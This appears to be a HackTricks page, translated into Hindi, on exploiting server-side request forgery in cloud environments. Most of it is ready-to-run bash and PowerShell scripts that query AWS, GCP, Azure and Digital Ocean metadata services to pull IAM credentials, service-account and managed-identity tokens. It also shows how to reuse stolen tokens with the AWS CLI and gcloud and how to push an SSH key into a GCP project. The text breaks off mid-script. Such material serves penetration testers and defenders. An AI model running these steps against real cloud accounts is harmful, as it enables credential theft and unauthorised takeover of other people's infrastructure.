# Cloud SSRF

{{#include ../../banners/hacktricks-training.md}}

## AWS

### AWS EC2 वातावरण में SSRF का दुरुपयोग

**मेटाडेटा** एंडपॉइंट को किसी भी EC2 मशीन के अंदर से एक्सेस किया जा सकता है और यह इसके बारे में दिलचस्प जानकारी प्रदान करता है। यह URL में उपलब्ध है: `http://169.254.169.254` ([मेटाडेटा के बारे में जानकारी यहाँ](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html))।

मेटाडेटा एंडपॉइंट के **2 संस्करण** हैं। **पहला** संस्करण **GET** अनुरोधों के माध्यम से एंडपॉइंट को **एक्सेस** करने की अनुमति देता है (इसलिए कोई भी **SSRF इसका दुरुपयोग कर सकता है**)। **संस्करण 2** के लिए, [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), आपको एक **टोकन** के लिए **PUT** अनुरोध भेजकर पूछना होगा और फिर उस टोकन का उपयोग करके दूसरे HTTP हेडर के साथ मेटाडेटा को एक्सेस करना होगा (इसलिए इसे SSRF के साथ **दुरुपयोग करना अधिक जटिल है**)।

> [!CAUTION]
> ध्यान दें कि यदि EC2 उदाहरण IMDSv2 को लागू कर रहा है, [**दस्तावेज़ों के अनुसार**](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html), **PUT अनुरोध का उत्तर** में **हॉप लिमिट 1** होगा, जिससे EC2 उदाहरण के अंदर एक कंटेनर से EC2 मेटाडेटा को एक्सेस करना असंभव हो जाएगा।
>
> इसके अलावा, **IMDSv2** भी **`X-Forwarded-For` हेडर शामिल करने वाले टोकन को प्राप्त करने के लिए अनुरोधों को ब्लॉक करेगा**। यह गलत कॉन्फ़िगर किए गए रिवर्स प्रॉक्सी को इसे एक्सेस करने से रोकने के लिए है।

आप [दस्तावेज़ों में मेटाडेटा एंडपॉइंट के बारे में जानकारी](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html) पा सकते हैं। निम्नलिखित स्क्रिप्ट से इसमें से कुछ दिलचस्प जानकारी प्राप्त की जाती है:
```bash
EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
URL="http://169.254.169.254/latest/meta-data"

aws_req=""
if [ "$(command -v curl)" ]; then
aws_req="curl -s -f -H '$HEADER'"
elif [ "$(command -v wget)" ]; then
aws_req="wget -q -O - -H '$HEADER'"
else
echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
fi

printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

echo ""
echo "Account Info"
eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""

echo ""
echo "Network Info"
for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do
echo "Mac: $mac"
printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
echo ""
done

echo ""
echo "IAM Role"
eval $aws_req "$URL/iam/info"
for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do
echo "Role: $role"
eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
echo ""
done

echo ""
echo "User Data"
# Search hardcoded credentials
eval $aws_req "http://169.254.169.254/latest/user-data"

echo ""
echo "EC2 Security Credentials"
eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
```
एक **सार्वजनिक रूप से उपलब्ध IAM क्रेडेंशियल्स** के उदाहरण के लिए आप जा सकते हैं: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

आप सार्वजनिक **EC2 सुरक्षा क्रेडेंशियल्स** भी देख सकते हैं: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

आप फिर **उन क्रेडेंशियल्स को AWS CLI के साथ उपयोग कर सकते हैं**। इससे आपको **उस भूमिका के पास जो अनुमति है, वह सब कुछ करने की अनुमति मिलेगी**।

नए क्रेडेंशियल्स का लाभ उठाने के लिए, आपको इस तरह का एक नया AWS प्रोफ़ाइल बनाना होगा:
```
[profilename]
aws_access_key_id = ASIA6GG71[...]
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT[...]
aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
```
ध्यान दें कि **aws_session_token** प्रोफ़ाइल के काम करने के लिए अनिवार्य है।

[**PACU**](https://github.com/RhinoSecurityLabs/pacu) का उपयोग खोजे गए क्रेडेंशियल्स के साथ आपके विशेषाधिकारों का पता लगाने और विशेषाधिकारों को बढ़ाने के लिए किया जा सकता है।

### AWS ECS (कंटेनर सेवा) क्रेडेंशियल्स में SSRF

**ECS**, EC2 इंस्टेंस का एक तार्किक समूह है जिस पर आप एक एप्लिकेशन चला सकते हैं बिना अपने स्वयं के क्लस्टर प्रबंधन अवसंरचना को स्केल किए क्योंकि ECS यह आपके लिए प्रबंधित करता है। यदि आप **ECS** में चल रही सेवा को समझौता करने में सफल होते हैं, तो **मेटाडेटा एंडपॉइंट्स बदल जाते हैं**।

यदि आप _**http://169.254.170.2/v2/credentials/\<GUID>**_ पर पहुँचते हैं, तो आप ECS मशीन के क्रेडेंशियल्स पाएंगे। लेकिन पहले आपको **\<GUID>** ढूंढना होगा। \<GUID> खोजने के लिए आपको मशीन के अंदर **environ** वेरिएबल **AWS_CONTAINER_CREDENTIALS_RELATIVE_URI** को पढ़ना होगा।\
आप इसे `file:///proc/self/environ` पर **Path Traversal** का उपयोग करके पढ़ने में सक्षम हो सकते हैं।\
उल्लेखित http पता आपको **AccessKey, SecretKey और token** देना चाहिए।
```bash
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```
> [!NOTE]
> ध्यान दें कि **कुछ मामलों** में आप कंटेनर से **EC2 मेटाडेटा इंस्टेंस** तक पहुँच सकते हैं (IMDSv2 TTL सीमाओं की जाँच करें जो पहले उल्लेखित हैं)। इन परिदृश्यों में, आप कंटेनर से कंटेनर IAM भूमिका और EC2 IAM भूमिका दोनों तक पहुँच सकते हैं।

### SSRF for AWS Lambda

इस मामले में **क्रेडेंशियल्स env वेरिएबल्स में संग्रहीत होते हैं**। इसलिए, उन्हें एक्सेस करने के लिए आपको कुछ ऐसा एक्सेस करना होगा जैसे **`file:///proc/self/environ`**।

**दिलचस्प env वेरिएबल्स** के **नाम** हैं:

- `AWS_SESSION_TOKEN`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_ACCES_KEY_ID`

इसके अलावा, IAM क्रेडेंशियल्स के अलावा, Lambda फ़ंक्शंस के पास **इवेंट डेटा होता है जो फ़ंक्शन शुरू होने पर पास किया जाता है**। यह डेटा फ़ंक्शन के लिए [runtime interface](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html) के माध्यम से उपलब्ध कराया जाता है और इसमें **संवेदनशील** **जानकारी** हो सकती है (जैसे **stageVariables** के अंदर)। IAM क्रेडेंशियल्स के विपरीत, यह डेटा मानक SSRF के माध्यम से **`http://localhost:9001/2018-06-01/runtime/invocation/next`** पर पहुँच योग्य है।

> [!WARNING]
> ध्यान दें कि **lambda क्रेडेंशियल्स** **env वेरिएबल्स** के अंदर होते हैं। इसलिए यदि **स्टैक ट्रेस** lambda कोड env वेरिएबल्स को प्रिंट करता है, तो ऐप में **एक त्रुटि उत्पन्न करके उन्हें एक्सफिल्ट्रेट करना संभव है**।

### SSRF URL for AWS Elastic Beanstalk

हम API से `accountId` और `region` प्राप्त करते हैं।
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
हम फिर API से `AccessKeyId`, `SecretAccessKey`, और `Token` प्राप्त करते हैं।
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
![](https://miro.medium.com/max/60/0*4OG-tRUNhpBK96cL?q=20) ![](https://miro.medium.com/max/1469/0*4OG-tRUNhpBK96cL)

फिर हम क्रेडेंशियल्स का उपयोग करते हैं `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/` के साथ।

## GCP

आप [**यहां मेटाडेटा एंडपॉइंट्स के बारे में दस्तावेज़ पा सकते हैं**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata)।

### Google Cloud के लिए SSRF URL

HTTP हेडर **`Metadata-Flavor: Google`** की आवश्यकता होती है और आप निम्नलिखित URLs के साथ मेटाडेटा एंडपॉइंट तक पहुंच सकते हैं:

- http://169.254.169.254
- http://metadata.google.internal
- http://metadata

जानकारी निकालने के लिए दिलचस्प एंडपॉइंट्स:
```bash
# /project
# Project name and number
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
echo "  Name: $sa"
echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"
```
बीटा को वर्तमान में एक हेडर की आवश्यकता नहीं है (धन्यवाद Mathias Karlsson @avlidienbrunn)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```
> [!CAUTION]
> **निकाली गई सेवा खाता टोकन** का **उपयोग करने के लिए** आप बस यह कर सकते हैं:
>
> ```bash
> # Via env vars
> export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
> gcloud projects list
>
> # Via setup
> echo "<token>" > /some/path/to/token
> gcloud config set auth/access_token_file /some/path/to/token
> gcloud projects list
> gcloud config unset auth/access_token_file
> ```

### SSH कुंजी जोड़ें

टोकन निकालें
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```
टोकन के दायरे की जांच करें (पिछले आउटपुट के साथ या निम्नलिखित चलाकर)
```bash
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  {
"issued_to": "101302079XXXXX",
"audience": "10130207XXXXX",
"scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
"expires_in": 2443,
"access_type": "offline"
}
```
अब SSH कुंजी को पुश करें।
```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
-H "Content-Type: application/json"
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```
### Cloud Functions

मेटाडेटा एंडपॉइंट VMs की तरह ही काम करता है लेकिन कुछ एंडपॉइंट्स के बिना:
```bash
# /project
# Project name and number
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id

# /instance
# ID
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# Auto MTLS config
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/platform-security/auto-mtls-configuration
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
echo "  Name: $sa"
echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
echo "  ==============  "
done
```
## Digital Ocean

> [!WARNING]
> AWS Roles या GCP सेवा खाता जैसी चीजें नहीं हैं, इसलिए मेटाडेटा बॉट क्रेडेंशियल्स मिलने की उम्मीद न करें

Documentation available at [`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)
```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```
## Azure

### Azure VM

[**Docs** in here](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux).

- **ज़रूरी** है कि हेडर `Metadata: true` हो
- **नहीं** होना चाहिए `X-Forwarded-For` हेडर

> [!TIP]
> एक Azure VM में 1 सिस्टम प्रबंधित पहचान और कई उपयोगकर्ता प्रबंधित पहचानें हो सकती हैं। जिसका मतलब है कि आप **VM से जुड़ी सभी प्रबंधित पहचानों का अनुकरण कर सकते हैं**।
>
> जब मेटाडेटा एंडपॉइंट के लिए एक्सेस टोकन का अनुरोध किया जाता है, तो डिफ़ॉल्ट रूप से मेटाडेटा सेवा **सिस्टम असाइन की गई प्रबंधित पहचान** का उपयोग करके टोकन उत्पन्न करेगी, यदि कोई सिस्टम असाइन की गई प्रबंधित पहचान है। यदि केवल **एक उपयोगकर्ता असाइन की गई प्रबंधित पहचान** है, तो इसका उपयोग डिफ़ॉल्ट रूप से किया जाएगा। हालाँकि, यदि कोई सिस्टम असाइन की गई प्रबंधित पहचान नहीं है और **कई उपयोगकर्ता असाइन की गई प्रबंधित पहचानें** हैं, तो मेटाडेटा सेवा एक त्रुटि लौटाएगी जो यह इंगित करती है कि कई प्रबंधित पहचानें हैं और यह आवश्यक है कि **यह निर्दिष्ट करें कि किसका उपयोग करना है**।
>
> दुर्भाग्यवश, मुझे कोई मेटाडेटा एंडपॉइंट नहीं मिला जो यह दर्शाता हो कि एक VM के पास सभी MIs जुड़ी हुई हैं, इसलिए एक Red Team के दृष्टिकोण से एक VM के लिए सभी असाइन की गई प्रबंधित पहचानों का पता लगाना एक कठिन कार्य हो सकता है।
>
> इसलिए, सभी जुड़े हुए MIs को खोजने के लिए आप कर सकते हैं:
>
> - **az cli** के साथ **जुड़ी हुई पहचानों को प्राप्त करें** (यदि आपने पहले से Azure टेनेट में किसी प्रिंसिपल को समझौता किया है)
>
> ```bash
> az vm identity show \
>   --resource-group <rsc-group> \
>   --name <vm-name>
> ```
>
> - मेटाडेटा में डिफ़ॉल्ट जुड़े हुए MI का उपयोग करके **जुड़ी हुई पहचानों को प्राप्त करें**:
>
> ```bash
> export API_VERSION="2021-12-13"
>
> # डिफ़ॉल्ट MI से टोकन प्राप्त करें
> export TOKEN=$(curl -s -H "Metadata:true" \
>   "http://169.254.169.254/metadata/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/" \
>   | jq -r '.access_token')
>
> # आवश्यक विवरण प्राप्त करें
> export SUBSCRIPTION_ID=$(curl -s -H "Metadata:true" \
>   "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.subscriptionId')
> export RESOURCE_GROUP=$(curl -s -H "Metadata:true" \
>   "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.resourceGroupName')
> export VM_NAME=$(curl -s -H "Metadata:true" \
>   "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.name')
>
> # जुड़े हुए MIs प्राप्त करने का प्रयास करें
> curl -s -H "Authorization: Bearer $TOKEN" \
>   "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.Compute/virtualMachines/$VM_NAME?api-version=$API_VERSION" | jq
> ```
>
> - टेनेट में सभी परिभाषित प्रबंधित पहचानों को **प्राप्त करें** और देखें कि क्या इनमें से कोई VM से जुड़ी हुई है:
>
> ```bash
> az identity list
> ```

> [!CAUTION]
> टोकन अनुरोधों में `object_id`, `client_id` या `msi_res_id` में से किसी भी पैरामीटर का उपयोग करें ताकि यह इंगित किया जा सके कि आप किस प्रबंधित पहचान का उपयोग करना चाहते हैं ([**docs**](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)). यदि कोई नहीं, तो **डिफ़ॉल्ट MI का उपयोग किया जाएगा**।

{{#tabs}}
{{#tab name="Bash"}}
```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions

echo "Instance details"
curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"

echo "Load Balancer details"
curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"

echo "Management Token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

echo "Graph token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"

echo "Vault token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

echo "Storage token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
```
{{#endtab}}

{{#tab name="PS"}}
```bash
# Powershell
Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
## User data
$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

## Get management token
(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" -Headers @{"Metadata"="true"}).access_token

## Get graph token
(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://graph.microsoft.com/" -Headers @{"Metadata"="true"}).access_token

## Get vault token
(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net/" -Headers @{"Metadata"="true"}).access_token

## Get storage token
(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://storage.azure.com/" -Headers @{"Metadata"="true"}).access_token


# More Paths
/metadata/instance?api-version=2017-04-02
/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```
{{#endtab}}
{{#endtabs}}

### Azure App & Functions Services & Automation Accounts

**env** से आप **`IDENTITY_HEADER`** और **`IDENTITY_ENDPOINT`** के मान प्राप्त कर सकते हैं। जिसका उपयोग आप मेटाडेटा सर्वर के साथ बात करने के लिए एक टोकन इकट्ठा करने के लिए कर सकते हैं।

अधिकतर, आप इन संसाधनों में से किसी एक के लिए टोकन चाहते हैं:

- [https://storage.azure.com](https://storage.azure.com/)
- [https://vault.azure.net](https://vault.azure.net/)
- [https://graph.microsoft.com](https://graph.microsoft.com/)
- [https://management.azure.com](https://management.azure.com/)

> [!CAUTION]
> टोकन अनुरोधों में `object_id`, `client_id` या `msi_res_id` में से किसी भी पैरामीटर का उपयोग करें ताकि आप जिस प्रबंधित पहचान का उपयोग करना चाहते हैं उसे इंगित किया जा सके ([**docs**](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token))। यदि कोई नहीं, तो **डिफ़ॉल्ट MI का उपयोग किया जाएगा**।

{{#tabs}}
{{#tab name="Bash"}}
```bash
# Check for those env vars to know if you are in an Azure app
echo $IDENTITY_HEADER
echo $IDENTITY_ENDPOINT

# (Fingerprint) You should also be able to find the folder:
ls /opt/microsoft

# Get management token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
# Get graph token
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
# Get vault token
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
# Get storage token
curl "$IDENTITY_ENDPOINT?resource=https://storage.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
```
{{#endtab}}

{{#tab name="PS"}}
```bash
# Define the API version
$API_VERSION = "2019-08-01"

# Function to get a token for a specified resource
function Get-Token {
param (
[string]$Resource
)
$url = "$IDENTITY_ENDPOINT?resource=$Resource&api-version=$API_VERSION"
$headers = @{
"X-IDENTITY-HEADER" = $IDENTITY_HEADER
}
try {
$response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get
$response.access_token
} catch {
Write-Error "Error obtaining token for $Resource: $_"
}
}

# Get Management Token
$managementToken = Get-Token -Resource "https://management.azure.com/"
Write-Host "Management Token: $managementToken"

# Get Graph Token
$graphToken = Get-Token -Resource "https://graph.microsoft.com/"
Write-Host "Graph Token: $graphToken"

# Get Vault Token
$vaultToken = Get-Token -Resource "https://vault.azure.net/"
Write-Host "Vault Token: $vaultToken"

# Get Storage Token
$storageToken = Get-Token -Resource "https://storage.azure.com/"
